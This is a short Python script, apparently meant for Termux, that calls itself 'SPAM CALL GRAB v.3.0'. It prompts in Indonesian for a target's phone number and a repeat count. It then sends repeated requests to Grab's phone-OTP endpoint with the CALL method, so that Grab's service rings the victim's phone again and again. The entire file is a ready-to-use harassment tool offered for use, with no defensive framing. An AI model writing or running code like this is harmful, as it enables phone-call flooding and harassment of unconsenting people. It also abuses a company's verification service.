#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by thetermuxchoice

try:
	import os, requests, time
except ModuleNotFoundError:
	print("\nSepertinya module requests belum di install")
	print("$ pip install requests\n")
	exit()

os.system('clear')
c=('\033[1;36m')
r=('\033[1;31m')
g=('\033[1;32m')
w=('\033[1;37m')
print("""%s
			SPAM CALL GRAB v.3.0%s
 ,_     _‚
 |\\\___//| %sPenyusun : Henrycko%s
 |=6   6=|  %sPendukung: Dzakira Alzena Daiva%s
 \=._Y_.=/  %sGmail    : thetermuxchoice@gmail.com%s
  )  `  (    ,
 /       \  ((
 |       |   ))
/| |   | |\_//	%sMASUKAN NOMOR DENGAN "62" (EX: 62XXXXXXXXXXXX)%s
\| |._.| |/-’
 '"'   '"'
<NOTE> Github : https://github.com/Henrycko"""%(c,r,g,r,g,r,g,r,g,r,w,r))
print("%s[*] Klik ENTER untuk melewati step%s"%(g,g))
no1 = input("[?] Nomor Target => %s"%(w))
jlmh=int(input("%s[?] Jumlah spam => %s"%(g,w)))
dt={'method':'CALL','countryCode':'id','phoneNumber':no1,'templateID':'pax_android_production'}

try:
	print()
	print("%s[-] RESULT:%s"%(r,w))
	for i in range(jlmh):
		print("[!] PLEASE WAIT...")
		idk=("challengeID")
		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt)
		if str(idk) in str(r1.text):
			print("[+] Target1 Berhasil!")
		else:
			print("[-] Target1 Gagal!")
		print("="*30)
		time.sleep(1)
except KeyboardInterrupt:
	print("%sThank's Good bye!"%(c))
